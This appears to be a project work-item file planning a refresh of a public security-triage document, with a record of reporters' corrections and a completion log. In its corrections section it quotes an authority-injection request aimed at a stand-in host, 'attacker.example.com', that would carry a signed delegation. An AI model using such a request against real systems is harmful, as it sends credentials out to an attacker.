# W6-01 — Refresh the public triage document

**Issue:** [#40](https://github.com/dfinity/public-multidex/issues/40) item 2 — OhShii Labs
**Status:** CONFIRMED stale at `01d2b23` (2026-08-14)
**Severity:** `#play` LOW / `#production` LOW — **but the highest-leverage item in the queue**
**Effort:** M

## Why this is not a nitpick

`docs/issue-triage-2026-08.md` is the document **all three teams dedup against**. It is the only
published statement of what is already known, and every report any of them writes is checked against
it before filing.

The reporter's framing is right and it is not about them: while it lists items as open that 1.60
already fixed, someone spends an evening re-deriving a closed finding; while it marks §1.7
implemented, someone skips an open one because the document says it is done. That cost lands on
andreij6 and the Menese team as much as on us, and none of them has any way to know.

They also held this round back out of politeness about our queue depth, and filed it anyway
**because of this item**. That is worth honouring by fixing it early.

## What is stale — verified

1. **§1.7 is marked implemented and is not.** Nine heartbeat subtasks still run inline and
   unisolated. See [W3-08](W3-08-heartbeat-subtask-isolation.md), which I verified directly against
   the heartbeat body.
2. **Six §3 items were fixed in 1.60 itself and are still listed as open.**
3. **It stops at #21.** Round 2 (#23–#28) and rounds 3–6 (#36–#41) are not covered at all — this task
   queue is that gap, and the document should point at it.
4. **§2 cleared `settleNettedPair`**, which #15 item 2 corrects — see [W4-03](W4-03-settle-netted-pair-dust.md).
5. **§6's deferred list needs status**: volume credit ([W4-18](W4-18-volume-credit-consolidation.md)),
   `_minSourcesOverride` ([W4-19](W4-19-min-sources-override-clamp.md)), CSP headers
   ([W4-20](W4-20-csp-header-verification.md)), the `order.id` join ([W4-21](W4-21-order-id-join-archive.md))
   — all still open, none re-stated since.

## Reporters' own corrections to fold in

These are theirs, and recording them is part of keeping the document trustworthy:

- **#37.4** — OhShii **retracted** the claim that a signed delegation reaches `attacker.example.com`.
  Measured: `new Request("http://127.0.0.1:1@attacker.example.com/callback", …)` throws on credentials
  in the URL. The authority injection is real (`new URL(…).hostname` **is** the attacker host) but the
  send throws first. **So the final step of §1.2, credited as #11.4, is not established** — the defect
  was real and the fix is right, but the exploit chain as written is not.
- **#41.2 step 4 is correct and my first pass wrongly doubted it** — `claimPlayFunds` **is** genuinely
  retired. See [W6-02](W6-02-reconcile-checklist-and-kill-matrix.md).
- **#40.4 conflates two origin lists** — see [W6-03](W6-03-ii-origins-coverage.md).
- OhShii withdrew the `PRICE_MIN_SOURCES` 2→3 remedy after andreij6's #17 demonstrated it moves the
  failure rather than fixing it. Already reflected in §7.1; keep it visible.

## Fix

Either extend the existing document or add `docs/issue-triage-round2-6.md` and cross-link. Prefer
**extend** — three teams already know the filename.

Add a per-issue status table (open / fixed / partial / won't-fix + link to the task file here), so a
reporter can dedup in one read.

## Done when

- [ ] §1.7 corrected; the six §3 items marked fixed
- [ ] Rounds 2–6 covered with per-item status
- [ ] §2's `settleNettedPair` clearance corrected; §6 items given current status
- [ ] Reporters' own corrections and retractions recorded
- [ ] Pushed to the public mirror, since that is the only copy the reporters can read


**W3-08 note (2026-08-15):** §1.7 of the triage doc claims heartbeat isolation was implemented in 1.60; it was half-implemented (the `ignore tickX()` async dispatches only). W3-08 has now isolated the remaining nine inline subtasks behind a per-subtask breaker — update §1.7 to point at `hbRun`/`hbReady` and `test_heartbeat_isolation.sh`.

---
## Done — 2026-08-15 (sequenced after W6-02/03/04, whose outcomes it records)

The document three teams dedup against is current again, by in-place
correction plus a new §8:

- **Banner**: a REFRESH pointer routes deduplicators straight to §8.
- **§1.7** corrected — the "implemented" claim was half-true (async
  dispatches only); now records full isolation behind hbRun/hbReady with
  the pinning test named.
- **§2's settleNettedPair clearance withdrawn** (at the §7.2 row that
  corrected it, now marked FIXED W4-03).
- **§3**: six production-readiness items 1.60 fixed are marked fixed with
  what changed (each re-verified live this session before marking);
  #10.4's remaining half (module-hash verification) explicitly kept open.
- **§6**: all four deferred items resolved/decided with pointers.
- **§7.2**: every outstanding row marked FIXED with its mechanism.
- **§8**: the rounds 2–6 per-issue table — 68 rows generated from the task
  files themselves (issue item ↔ work item ↔ finding ↔ status), fixed vs
  decision distinguished (W4-21's doctrine call recorded as a decision);
  §8.2 lists this document's own corrections; §8.3 the honest remainder
  (W6-05..09 + module-hash); §8.4 the reporters' retractions verbatim-close
  (#37.4 partial retraction, #41.2 they-were-right, #40.4 disentangled,
  PRICE_MIN_SOURCES withdrawal).

**The push box:** NOT pushed — pushing to the public mirror is an explicit-
ask action in this repo (standing instruction). The document is ready; the
push belongs with the W6-05 outward batch when authorized.
